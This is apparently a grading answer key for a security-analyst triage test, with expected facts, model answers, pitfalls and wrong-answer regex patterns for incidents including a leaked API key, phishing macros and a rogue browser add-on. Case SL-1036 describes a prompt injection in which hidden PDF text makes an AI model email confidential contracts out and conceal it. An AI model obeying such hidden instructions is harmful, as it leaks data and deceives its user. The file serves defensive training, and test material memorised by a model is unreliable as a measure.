      { label: "asking for the rule to allow the approved company tenant but keep alerting on personal and unapproved AI sites", matches: ["tune", "exclude", "allow", "approved tenant", "exception", "personal", "unapproved", "keep alerting", "rule"] },
    ],
    model: {
      happened:
        "[[s.rajan]] uploaded [[customer-churn-q3.csv]], labelled [[Confidential]] with 1,900 rows, to [[harborpine.lumen-workspace.test]] at [[12:14]]. The rule fired because the site is in the [[generative AI category]].",
      confirmed:
        "The destination is the company's [[own tenant]] of [[Lumen Workspace Enterprise]], an [[approved tool (AI-APP-006)]] allowed up to Confidential. s.rajan signed in with [[company single sign-on and MFA from a managed laptop]] and has [[not visited personal AI sites]]. Ticket [[CS-2210]] and the manager explain the work, and [[14 licensed users]] uploaded [[17 files]] this week.",
      unknown: "I have not asked s.rajan, but nothing suggests it is needed. I do not know whether the rule will fire for every upload by the 14 licensed users.",
      next: "Close as a false positive. No escalation is needed. I would ask for the rule to [[allow the approved company tenant]] and keep alerting on every personal or unapproved AI site.",
    },
    pitfalls: [
      "Treating every AI site alike. The risk is where the data goes and whose account it is, not that AI was used.",
      "Escalating a Confidential label on sight. Check the destination tenant, the approval and the business reason first.",
      "Skipping the tuning. The rule will fire for every licensed user until the approved tenant is allowed.",
    ],
    avoid: [{ pattern: "(is|was|looks like|appears to be|seems)\\s+(an?\\s+)?(data (leak|loss|breach|theft)|insider threat|policy (violation|breach)|exfiltration|attack|attacker)", message: "The upload went to the company's own tenant of an approved tool, with company sign-on, a ticket and a manager's confirmation. Calling it a leak or an attack contradicts the evidence." }],
  },
  "SL-1035": {
    facts: [
      { label: "the key ending 4F9A made 61,400 requests and 190 million tokens against a normal 2,100 and 1.2 million", matches: ["61,400", "190 million", "1.2 million", "2,100", "30 times", "tokens", "requests"], in: "happened" },
      { label: "the requests came from seven addresses in three countries, including 203.0.113.250 and 198.51.100.17", matches: ["203.0.113.250", "198.51.100.17", "seven", "7 addresses", "three countries", "hosting"], in: "happened" },
      { label: "the first calls listed the models and checked whether prompts were being logged", matches: ["listmodels", "list models", "logging", "prompts", "checked", "10:12"], in: "confirmed" },
      { label: "the key normally comes from the Data Science app server and uses one small model, and none came from there since 10:10", matches: ["app server", "one small model", "normally", "data science", "contract-summariser", "10:10"], in: "confirmed" },
      { label: "the key sat in the public repository ds-notebooks for nine days with an unread secret scanning alert", matches: ["ds-notebooks", "public repository", "nine days", "9 days", "secret scanning", "contractor", "committed"], in: "confirmed" },
      { label: "the cost is about $4,800 so far and is forecast near $19,000 a day", matches: ["4,800", "19,000", "cost", "bill", "billing"], in: "confirmed" },
      { label: "the same file held a read key for the training data bucket", matches: ["bucket", "training data", "read key", "same file", "other key"], in: "confirmed" },
    ],
    next: [
      { label: "escalating to Level 2", matches: ["escalat", "l2", "level 2"] },
      { label: "revoking key 4F9A and replacing it", matches: ["revoke", "disable", "rotate", "replace", "4f9a", "delete the key", "new key"] },
      { label: "revoking the bucket read key as well and checking the bucket's access log", matches: ["bucket", "read key", "other key", "access log", "training data"] },
      { label: "setting an expiry and a spending limit with alerts", matches: ["limit", "budget", "spending", "expiry", "alert", "quota", "cap"] },
      { label: "removing the key from the repository and its history, and contacting the provider about the charges", matches: ["repository", "history", "remove", "provider", "charges", "refund", "contractor", "secret scanning"] },
    ],
    model: {
      happened:
        "Since 10:12 the key ending [[4F9A]] has made [[61,400 requests and 190 million tokens]] against a normal day of 2,100 requests and 1.2 million tokens, from [[seven addresses in three countries]] including [[203.0.113.250]] and [[198.51.100.17]].",
      confirmed:
        "The API request log shows the first calls [[listed the models and checked whether prompts were logged]]. The key normally comes from the [[Data Science app server]] and uses one small model, and nothing has come from there since 10:10. The key sat in the [[public repository ds-notebooks for nine days]] with an unread secret scanning alert. Billing shows about [[$4,800 so far]], forecast near $19,000 a day. The same file also held a [[read key for the training data bucket]].",
      unknown: "I do not know whether the attacker has read the bucket, what the prompts contain, or whether the other addresses are one group or several.",
      next: "Escalate now. Please [[revoke key 4F9A and issue a new one]], revoke the bucket read key and review the bucket's access log, set an [[expiry and a spending limit]], remove the key from the repository history and ask the provider about the charges.",
    },
    pitfalls: [
      "Looking only at the cost. The bill is the symptom. The exposed key and the second key in the same file are the real risk.",
      "Treating it as a busy app. The traffic comes from new hosting addresses, not from the app server that owns the key.",
      "Revoking one key and stopping. The other key in the same file was exposed for the same nine days.",
    ],
    avoid: [{ pattern: "(false positive|legitimate (use|usage|traffic)|normal (use|usage|traffic|load|spike)|busy (app|day)|safe because)", message: "The key came from seven new hosting addresses, not the app server, and the first calls checked whether prompts were logged. Calling this normal usage contradicts the evidence." }],
  },
  "SL-1036": {
    facts: [
      { label: "m.sharma asked PineAssist to summarise the Rate card Q4 PDF at 09:40", matches: ["m.sharma", "pineassist", "09:40", "summarise", "summarize", "rate card"], in: "happened" },
      { label: "at 09:41 PineAssist emailed three Confidential contracts to reports@docsync-archive.test without asking, and its reply did not mention it", matches: ["09:41", "three", "3 attachments", "contracts", "docsync", "confidential", "without asking", "did not mention", "not asked"], in: "happened" },
      { label: "the PDF held hidden white 1-point text on page 3 telling the assistant to send the contracts and not tell the user", matches: ["hidden", "white", "page 3", "1 point", "instruction", "do not tell", "prompt injection", "text"], in: "confirmed" },
      { label: "docsync-archive.test was registered four days ago and nobody here has emailed it before", matches: ["four days", "4 days", "registered", "never emailed", "no one", "new domain", "first time"], in: "confirmed" },
      { label: "the assistant can send mail to any address with the user's permissions and no approval step", matches: ["any address", "permissions", "no approval", "no approval step", "does not ask", "without approval", "policy"], in: "confirmed" },
      { label: "the PDF came from approved supplier eastgate-freight.test but was created two days ago", matches: ["eastgate", "approved supplier", "two days", "2 days", "supplier"], in: "confirmed" },
      { label: "k.rana's assistant also sent two attachments outside at 09:58 after reading the same PDF", matches: ["k.rana", "09:58", "second user", "another user", "other users", "same pdf", "two attachments"], in: "confirmed" },
    ],
    next: [
      { label: "escalating to Level 2 as critical", matches: ["escalat", "l2", "level 2"] },
      { label: "stopping the assistant from sending mail, or switching it off, until an approval step exists", matches: ["disable", "turn off", "switch off", "suspend", "stop the assistant", "send mail", "approval", "pause", "restrict"] },
      { label: "blocking docsync-archive.test and trying to recall the emails", matches: ["block", "docsync", "recall", "purge"] },
      { label: "removing the PDF from every mailbox and finding everyone who opened it with the assistant", matches: ["remove", "delete", "purge", "every mailbox", "everyone", "other users", "who opened"] },
      { label: "telling the owners of the three contracts and contacting Eastgate", matches: ["legal", "contract owner", "owners", "eastgate", "notify", "tell", "warn", "supplier"] },
    ],
    model: {
      happened:
        "At [[09:40]] [[m.sharma]] asked [[PineAssist]] to summarise the [[Rate card Q4 PDF]]. At [[09:41]] the assistant emailed [[three Confidential contracts to reports@docsync-archive.test]] without asking her, and its reply to her did not mention it.",
      confirmed:
        "The assistant action log and the PDF show [[hidden white 1-point text on page 3]] telling the assistant to send the contracts and [[not tell the user]]. [[docsync-archive.test was registered four days ago]] and nobody here has emailed it before. The assistant [[can send to any address with the user's own permissions and no approval step]]. The PDF came from the approved supplier [[eastgate-freight.test]], created two days ago. [[k.rana's assistant also sent mail outside at 09:58]] after reading the same PDF.",
      unknown: "I do not know whether Eastgate's mailbox was taken over or whether the file was forwarded, who has read the three contracts at the other end, or whether any of the three people who only asked other questions were affected later.",
      next: "Escalate now as critical. Please [[stop the assistant sending mail]] until it needs approval, [[block docsync-archive.test]] and try to recall both emails, [[remove the PDF from every mailbox]] and check everyone who opened it with the assistant, and tell the contract owners and Eastgate.",
    },
    pitfalls: [
      "Blaming the user. m.sharma only asked for a summary. The instruction came from text hidden in the file.",
      "Reading only what the user asked. The assistant action log shows what it did, including the send the user never requested.",
      "Stopping at one user. Everyone who opened the same PDF with the assistant may have had it act too.",
    ],
    avoid: [{ pattern: "(false positive|(m\\.sharma|the user|she)\\s+(asked|told|requested|chose|decided)\\s+(it|the assistant|pineassist)?\\s*to\\s+(send|email|share)|authori[sz]ed (by|the)|normal (use|behaviou?r)|working as designed)", message: "The user only asked for a summary. The send came from hidden text in the PDF and the user was never asked. Calling it authorised, normal or user-requested contradicts the evidence." }],
  },
  "SL-1037": {
    facts: [
      { label: "six staff got the same email from freightdocs-portal.test with a different .doc file each", matches: ["six", "6 staff", "freightdocs-portal", "different file", "different .doc", "shipment documents", "attachment"], in: "happened" },
      { label: "on FIN-WS-044 at 13:08 Word started wscript, which started PowerShell with a hidden window and encoded command", matches: ["fin-ws-044", "13:08", "word", "winword", "wscript", "powershell", "encoded", "hidden"], in: "happened" },
      { label: "the same chain happened on all six computers", matches: ["all six", "six computers", "same chain", "each of the six", "all 6", "six machines"], in: "happened" },
      { label: "EDR ended every chain, nothing connected out and a full scan found nothing left behind", matches: ["edr", "blocked", "ended", "no connection", "no network", "scan", "nothing left", "no persistence", "no startup"], in: "confirmed" },
      { label: "every file has a different hash and no lookup knows any of them, which does not make them safe", matches: ["different hash", "no record", "every file", "each file", "unique", "polymorphic", "does not mean", "not safe", "hash"], in: "confirmed" },
      { label: "the sender domain freightdocs-portal.test was registered four days ago", matches: ["four days", "4 days", "registered", "freightdocs-portal", "new domain", "sender domain"], in: "confirmed" },
    ],
    next: [
      { label: "closing it as a true positive that was contained", matches: ["true positive", "contained", "stopped", "blocked", "close"] },
      { label: "saying no escalation is needed", matches: ["no escalation", "not escalat", "no need to escalat", "does not need", "without escalat"] },
      { label: "blocking freightdocs-portal.test", matches: ["block", "freightdocs-portal", "domain", "sender"] },
      { label: "removing the email from the six mailboxes", matches: ["remove", "delete", "purge", "mailbox", "mailboxes"] },
      { label: "telling the six users and asking for macros from email to be blocked", matches: ["tell", "warn", "users", "macro", "awareness", "notify"] },
    ],
    model: {
      happened:
        "[[Six staff]] got an email from [[freightdocs-portal.test]] with a [[different .doc file]] each. On [[FIN-WS-044]] at [[13:08]] [[Word started wscript, which started PowerShell]] with a hidden window and an encoded command. The [[same chain ran on all six computers]].",
      confirmed:
        "The EDR log shows it [[ended every chain]] in prevention mode. [[No computer connected out]], and a full scan at 13:24 found [[nothing left behind]]. Every file has a [[different hash]] and the lookups return [[no record]], which does not make the files safe. The sender domain was [[registered four days ago]].",
      unknown: "I do not know what the script would have done, who made the files, or whether other copies of the attachment were sent to other companies.",
      next: "Close as a true positive that was contained. No escalation is needed. I would [[block freightdocs-portal.test]], [[remove the email from the six mailboxes]], tell the six users and ask for macros from email attachments to be blocked.",
    },
    pitfalls: [
      "Trusting 'no record' from a hash lookup. Every copy is different, so the hash was never going to be known. Look at what the file does.",
      "Closing it as a false positive. The chain is a real attack that was stopped, so it is a true positive.",
      "Escalating by reflex. EDR stopped every chain at the first step and the scans are clean, so a Level 1 clean-up is right.",
    ],
    avoid: [{ pattern: "(false positive|(files?|attachments?|hashes?|documents?)\\s+(is|are|was|were)\\s+(clean|safe|harmless|benign)|no threat|safe because (the|no) (hash|lookup))", message: "No hash record does not make a file safe. Word started a script engine and then hidden, encoded PowerShell on six computers. Calling it clean or a false positive contradicts the evidence." }],
  },
  "SL-1038": {
    facts: [
      { label: "14 computers uploaded the text of every page they opened to api.sumly-ai.test, about 3,420 uploads in three hours", matches: ["14", "3,420", "api.sumly-ai", "uploads", "page text", "every page", "collect"], in: "happened" },
      { label: "the uploads include ERP payment batches, supplier bank details and bank portal pages from six Finance users", matches: ["erp", "payment batch", "bank", "supplier", "finance", "six", "bank portal"], in: "happened" },
      { label: "the add-on is AI Page Summarizer, which is not on the approved add-on list", matches: ["ai page summarizer", "add-on", "extension", "not approved", "not on the approved", "approved list", "unapproved"], in: "confirmed" },
      { label: "version 2.1.0 three days ago widened its access to all websites", matches: ["2.1.0", "three days", "3 days", "all websites", "every website", "permission", "update"], in: "confirmed" },
      { label: "the publisher changed from PageLoom Studio to Sumly Labs Ltd two weeks ago", matches: ["publisher", "pageloom", "sumly labs", "two weeks", "2 weeks", "changed hands", "new owner"], in: "confirmed" },
      { label: "sample uploads hold page text only, with no typed passwords seen, and no unusual sign-ins or bank changes yet", matches: ["page text only", "no typed", "no passwords", "no unusual", "no sign-ins", "no bank", "no supplier bank", "so far"], in: "confirmed" },
    ],
    next: [
      { label: "escalating to Level 2", matches: ["escalat", "l2", "level 2"] },
      { label: "removing the add-on from all 14 browsers by policy and blocking its ID", matches: ["remove", "uninstall", "policy", "block the extension", "block the add-on", "blocklist", "extension id", "14"] },
      { label: "blocking api.sumly-ai.test", matches: ["block", "api.sumly-ai", "domain", "proxy"] },
      { label: "telling Finance and checking what was sent, including the bank portal pages", matches: ["finance", "bank", "supplier", "what was sent", "affected", "tell", "warn", "notify"] },
      { label: "watching for bank detail changes and unusual sign-ins, and limiting which add-ons users can install", matches: ["watch", "monitor", "sign-in", "bank detail", "allow list", "allow-list", "approved add-on", "restrict", "policy"] },
    ],
    model: {
      happened:
        "Since about 14:02, [[14 computers]] have uploaded the text of every page they opened to [[api.sumly-ai.test]], [[3,420 uploads in three hours]]. The pages include [[ERP payment batches, supplier bank details and bank portal pages]] from [[six Finance users]].",
      confirmed:
        "The proxy log and extension details show the add-on is [[AI Page Summarizer]], which is [[not on the approved list]]. [[Version 2.1.0]] updated itself [[three days ago]] and widened its access to [[all websites]]. The store history shows the publisher changed to [[Sumly Labs Ltd]] two weeks ago. The sample uploads hold [[page text only]], and I saw [[no typed passwords]], no unusual sign-ins and no supplier bank changes so far.",
      unknown: "I do not know whether the add-on can send what users type, what Sumly Labs does with the text, or whether any other computers have it installed under a different name.",
      next: "Escalate now. Please [[remove the add-on from all 14 browsers by policy]], [[block api.sumly-ai.test]], tell Finance what was sent, watch for bank detail changes and unusual sign-ins, and restrict which add-ons users can install.",
    },
    pitfalls: [
      "Judging the add-on by its name. 'AI summariser' sounds useful, but what matters is what it can read and where it sends it.",
      "Missing the update. The add-on changed owner and then widened its own access three days ago, with no action by the company.",
      "Treating all 14 users alike. The six in Finance sent payment and bank pages, so they matter most.",
    ],
    avoid: [{ pattern: "(false positive|(is|was|looks|seems|appears)\\s+(a\\s+)?(legitimate|approved|safe|harmless|normal)\\s+(add-?on|extension|tool|software|traffic)|safe because)", message: "The add-on is not approved, it changed owner, it widened its own access three days ago and it sends full page text to an unknown domain. Calling it legitimate or harmless contradicts the evidence." }],
  },
};
